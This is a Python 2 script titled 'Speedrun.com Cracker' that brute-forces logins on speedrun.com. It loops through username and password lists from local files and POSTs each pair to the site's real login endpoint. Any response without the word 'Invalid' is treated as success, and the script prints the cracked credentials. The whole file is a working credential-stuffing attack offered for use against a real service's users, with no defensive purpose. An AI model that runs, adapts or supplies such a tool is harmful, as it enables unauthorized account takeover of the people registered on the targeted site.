
# Speedrun.com Cracker 6/22/2018
# Coded by Pythogen

import sys
import requests

print """
 _______                       __                                          
|     __|.-----.-----.-----.--|  |.----.--.--.-----.  .----.-----.--------.
|__     ||  _  |  -__|  -__|  _  ||   _|  |  |     |__|  __|  _  |        |
|_______||   __|_____|_____|_____||__| |_____|__|__|__|____|_____|__|__|__|
         |__|                                                              
					  - Cracking the elite gamers -
"""

# Default login URL (Use 'url' command to set your target)
login_URL = "https://www.speedrun.com/ajax_login.php"
# Detecting incorrect password
keyword = "Invalid"

uname = 'a'
pwd = 'a'
inc = 0
aPlace = 0
bPlace = 3

def console():
	while(True):
		cmd = raw_input(" Enter command> ")
		if cmd == "help" or cmd == "?":
			print """\n Commands:
	go - Activate Cracker
	exit - Exit Cracker
			"""
		elif cmd == "exit":
			sys.exit()
		elif cmd == "go":
			print "\n Speedrun.com Cracker Activated! \n"
			bruteforce()
		else:
			print "\n Invalid Command\n"

def find_between( s, first, last ):
    try:
        start = s.index( first ) + len( first )
        end = s.index( last, start )
        return s[start:end]
    except ValueError:
        return ""

def bruteforce():
	global aPlace
	global bPlace
	global keyword
	global host
	global redirect
	global login_URL

	text_file = open("list.txt", "r")
	text_file2 = open("pw.txt", "r")

	with requests.Session() as c:
	
		# Username List 
		USERNAME = text_file.read().split('\n')
		# Password List
		PASSWORD = text_file2.read().split('\n')

		# Username cycle
		for u in USERNAME:
			# Password cycle (Only first three words)
			#for p in PASSWORD[aPlace:bPlace]:
			for p in PASSWORD:
				# Print process
				uname = u
				pwd = p
				print ' %s:%s' % (u,p)

				# 1) Direct to login url. Prepare for POST login
				c.get(login_URL)

				#POST Login data
				login_data = \
				{
					'username': uname,
					'password': pwd,
				}

				#Header data
				header_data = \
				{
				}

				# 2) Submit POST data. Initialize login
				bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)

				# 4) Looking for keyword indicating successful login
				Check = bruteforce.page.content.find(keyword)

				# Check = incorrect , Check2 = invalid
				# If 'incorrect' and 'invalid' not found, then you've cracked the password.
				if Check == -1:
					print "\n Double Checking... \n"
					c.get(login_URL)

					# 2) Submit POST data. Initialize login
					bruteforce.page = c.post(login_URL, data=login_data, headers=header_data)

					# 4) Looking for keyword indicating successful login
					Check2 = bruteforce.page.content.find(keyword)
					if Check2 == -1:
						print "\n Cracked: %s:%s \n" % (u,p)
						return
				# Otherwise, continue..
				else:
					pass

		text_file.close()
		text_file2.close()
		print ""

console()